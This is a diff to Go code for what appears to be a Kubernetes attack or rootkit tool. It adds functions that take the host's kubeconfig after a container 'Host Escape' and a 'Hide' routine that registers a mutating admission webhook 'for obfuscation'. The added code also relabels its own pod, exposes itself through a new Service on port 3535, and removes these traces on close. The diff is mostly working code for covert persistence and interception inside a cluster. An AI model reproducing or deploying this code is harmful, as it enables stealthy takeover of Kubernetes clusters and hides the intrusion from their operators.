@@ -23,7 +23,13 @@ import (
 	"fmt"
 	"io/ioutil"
 	"net/http"
+	"os"
+	"strings"
 	"time"
+
+	"k8s.io/apimachinery/pkg/util/intstr"
+
+	v1 "k8s.io/api/core/v1"
 
 	"k8s.io/client-go/tools/clientcmd"
 
@@ -41,25 +47,35 @@ type Runtime struct {
 	connected  bool
 	namespace  string
 	client     *kubernetes.Clientset
+	labels     map[string]string
 
 	caPEM         *bytes.Buffer
 	certPEM       *bytes.Buffer
 	privateKeyPEM *bytes.Buffer
+
+	server   *http.Server
+	self     *v1.Pod
+	hostname string
 }
 
 const (
-	DefaultServiceAccount string = "default"
-	NamespaceLocation     string = "/var/run/secrets/kubernetes.io/serviceaccount/namespace"
-	HostKubeconfig        string = "/root/.kube/config"
+	NamespaceLocation string = "/var/run/secrets/kubernetes.io/serviceaccount/namespace"
+	HostKubeconfig    string = "/root/.kube/config"
 )
 
 var (
-	RuntimeTimeout time.Duration = time.Second * 3
+	DefaultAddrHost string        = ""
+	DefaultAddrPort int32         = 3535
+	RuntimeTimeout  time.Duration = time.Second * 3
 )
 
 func NewRuntime(identifier string) *Runtime {
 	return &Runtime{
 		identifier: identifier,
+		labels: map[string]string{
+			"app":  identifier,
+			"n0va": identifier,
+		},
 	}
 }
 
@@ -81,7 +97,7 @@ func (r *Runtime) ServiceName() string {
 }
 
 func (r *Runtime) Addr() string {
-	return fmt.Sprintf("%s:%d", "", 80)
+	return fmt.Sprintf("%s:%d", DefaultAddrHost, DefaultAddrPort)
 }
 
 func (r *Runtime) Orgs() []string {
@@ -96,14 +112,19 @@ func (r *Runtime) Hide() error {
 		return fmt.Errorf("unable to hide until connected. use runtime.EscapeInit() or runtime.InClusterInit()")
 	}
 
+	logrus.Infof("Entropy. Generating mTLS material (this may take awhile)...")
+
 	// Create Cert Material
 	err := r.Certs()
 	if err != nil {
 		return fmt.Errorf("unable to generate TLS material for obfuscation: %v", err)
 	}
-	logrus.Infof("Generated mTLS cert material for Mutating WebHook")
+	logrus.Infof("Generated mTLS cert material for MutatingWebhookConfiguration")
 
-	// Create a mutating webhook config
+	// Idempotent MutatingWebhookConfiguration
+	r.Client().AdmissionregistrationV1().MutatingWebhookConfigurations().Delete(context.TODO(), r.Identifier(), metav1.DeleteOptions{})
+
+	// Create MutatingWebhookConfiguration
 	sideEffect := admissionregistrationv1.SideEffectClassNone
 	m := &admissionregistrationv1.MutatingWebhookConfiguration{
 		ObjectMeta: metav1.ObjectMeta{
@@ -119,7 +140,7 @@ func (r *Runtime) Hide() error {
 						Namespace: r.Namespace(),
 						Name:      r.ServiceName(),
 						Path:      &InjectionPath,
-						//Port:      nil,
+						Port:      &DefaultAddrPort,
 					},
 					CABundle: r.caPEM.Bytes(), // Inject CA Pem for the API server here!
 				},
@@ -139,27 +160,73 @@ func (r *Runtime) Hide() error {
 			},
 		},
 	}
-
 	_, err = r.Client().AdmissionregistrationV1().MutatingWebhookConfigurations().Create(context.TODO(), m, metav1.CreateOptions{})
 	if err != nil {
-		return fmt.Errorf("unable to create mutating webhook configuration: %v", err)
+		return fmt.Errorf("unable to create MutatingWebhookConfiguration: %v", err)
+	}
+	logrus.Infof("Created: MutatingWebhookConfiguration [%s.%s]", r.Identifier(), r.Namespace())
+
+	// Ensure self has labels
+	self := r.Self()
+	if self != nil {
+
+		for k, v := range r.labels {
+			logrus.Infof("Updated:        %s:%s", k, v)
+			self.Labels[k] = v
+		}
+		_, err = r.Client().CoreV1().Pods(r.Namespace()).Update(context.TODO(), self, metav1.UpdateOptions{})
+		if err != nil {
+			return fmt.Errorf("unable to update self: %v", err)
+		}
+		logrus.Infof("Updated: Self [%s.%s] labels:", self.Name, r.Namespace())
+
+	} else {
+		logrus.Warnf("Unable to update self pod!")
 	}
 
-	logrus.Infof("Created: Mutating WebHook [%s].[%s]", r.Identifier(), r.Namespace())
+	// Idempotent Service
+	r.Client().CoreV1().Services(r.Namespace()).Delete(context.TODO(), r.Identifier(), metav1.DeleteOptions{})
+
+	// Create Service
+	s := &v1.Service{
+		ObjectMeta: metav1.ObjectMeta{
+			Name:      r.Identifier(),
+			Namespace: r.Namespace(),
+		},
+		Spec: v1.ServiceSpec{
+			Ports: []v1.ServicePort{
+				{
+					Port: DefaultAddrPort,
+					TargetPort: intstr.IntOrString{
+						IntVal: DefaultAddrPort,
+					},
+				},
+			},
+			Selector: map[string]string{
+				"app":  r.Identifier(),
+				"n0va": r.Identifier(),
+			},
+		},
+	}
+	_, err = r.Client().CoreV1().Services(r.Namespace()).Create(context.TODO(), s, metav1.CreateOptions{})
+	if err != nil {
+		return fmt.Errorf("unable to create Service: %v", err)
+	}
+	logrus.Infof("Created: Service [%s]", r.Identifier())
 
 	pair, err := tls.X509KeyPair(r.certPEM.Bytes(), r.privateKeyPEM.Bytes())
 	if err != nil {
 		return fmt.Errorf("failed to load certificate key pair: %v", err)
 	}
 
-	logrus.Infof("Generated [%d]bytes X509 pair for server", len(pair.OCSPStaple))
+	logrus.Infof("Generated X509 pair for server")
 
 	server := &http.Server{
 		Addr:      r.Addr(),
 		TLSConfig: &tls.Config{Certificates: []tls.Certificate{pair}},
 	}
 
-	logrus.Infof("Initalizing server: %s", r.Addr())
+	logrus.Infof("Initalizing server [%s]", r.Addr())
 
 	// Handle paths
 	mux := &http.ServeMux{}
@@ -168,13 +235,58 @@ func (r *Runtime) Hide() error {
 
 	// Set the handler
 	server.Handler = mux
+	r.server = server
+	logrus.Infof("Listening on %s%s...", r.ServiceName(), InjectionPath)
+	server.ListenAndServeTLS("", "")
+	return nil
+}
 
-	logrus.Infof("Listening...")
+func (r *Runtime) Open() error {
+	r.hostname = os.Getenv("HOSTNAME")
+	if r.hostname != "" {
+		logrus.Infof("Hostname: %s", r.hostname)
+	} else {
+		logrus.Warnf("Empty Environmental Variable HOSTNAME")
+	}
+	// Add labels to self
+	pods, err := r.Client().CoreV1().Pods(r.Namespace()).List(context.TODO(), metav1.ListOptions{})
+	if err != nil {
+		return fmt.Errorf("unable to list pods: %v", err)
+	}
+	for _, pod := range pods.Items {
+		// Match the full pod to the identifier!
+		if strings.Contains(pod.String(), r.identifier) {
+			logrus.Infof("Found self: pod.%s", pod.Name)
+			r.self = &pod
+			return nil
+		}
+	}
+	logrus.Warnf("Unable to find self pod! Possibly running in local mode!")
+	return nil
+}
 
-	return server.ListenAndServeTLS("", "")
+func (r *Runtime) Close() {
+	if !r.connected {
+		return
+	}
+	logrus.Warnf("Closing...")
+	if r.server != nil {
+		r.server.Shutdown(context.Background())
+		logrus.Infof("Shutting down server [%s]", r.Addr())
+	}
+	err := r.Client().AdmissionregistrationV1().MutatingWebhookConfigurations().Delete(context.TODO(), r.Identifier(), metav1.DeleteOptions{})
+	if err == nil {
+		logrus.Infof("Deleted: MutatingWebhookConfiguration [%s.%s]", r.Identifier(), r.Namespace())
+	}
+	err = r.Client().CoreV1().Services(r.Namespace()).Delete(context.TODO(), r.Identifier(), metav1.DeleteOptions{})
+	if err == nil {
+		logrus.Infof("Deleted: Service [%s.%s]", r.Identifier(), r.Namespace())
+	}
 }
 
 func (r *Runtime) EscapeInit() error {
+
+	logrus.Infof("Initializing Kubernetes Client [Host Escape]")
 
 	// Host config
 	kubeconfig, err := HostKubeConfig()
@@ -185,6 +297,7 @@ func (r *Runtime) EscapeInit() error {
 	if err != nil {
 		return fmt.Errorf("unable to write /tmp kubeconfig: %v", err)
 	}
+	logrus.Infof("Wrote kubeconfig inside container: %s", HostKubeconfig)
 
 	cfg, err := clientcmd.BuildConfigFromFlags("", HostKubeconfig)
 	if err != nil {
@@ -193,7 +306,7 @@ func (r *Runtime) EscapeInit() error {
 
 	// Client
 	cfg.Timeout = RuntimeTimeout
-	logrus.Infof("Host   : %s", cfg.Host)
+	logrus.Infof("Kubernetes Host : %s", cfg.Host)
 	client, err := kubernetes.NewForConfig(cfg)
 	if err != nil {
 		return err
@@ -208,7 +321,7 @@ func (r *Runtime) EscapeInit() error {
 	// We have authenticated with Kubernetes, we can set the client
 	r.client = client
 	r.connected = true
-	return nil
+	return r.Open()
 }
 
 // InClusterInit will ensure the client and see if we are running inside a cluster
@@ -222,8 +335,7 @@ func (r *Runtime) InClusterInit() error {
 
 	// Client
 	cfg.Timeout = RuntimeTimeout
-	logrus.Infof("Host   : %s", cfg.Host)
-	logrus.Infof("Client : %s", cfg)
+	logrus.Infof("Kubernetes Host : %s", cfg.Host)
 	client, err := kubernetes.NewForConfig(cfg)
 	if err != nil {
 		return err
@@ -238,11 +350,15 @@ func (r *Runtime) InClusterInit() error {
 	// We have authenticated with Kubernetes, we can set the client
 	r.client = client
 	r.connected = true
-	return nil
+	return r.Open()
 }
 
 func (r *Runtime) Client() *kubernetes.Clientset {
 	return r.client
+}
+
+func (r *Runtime) Self() *v1.Pod {
+	return r.self
 }
 
 func (r *Runtime) Identifier() string {
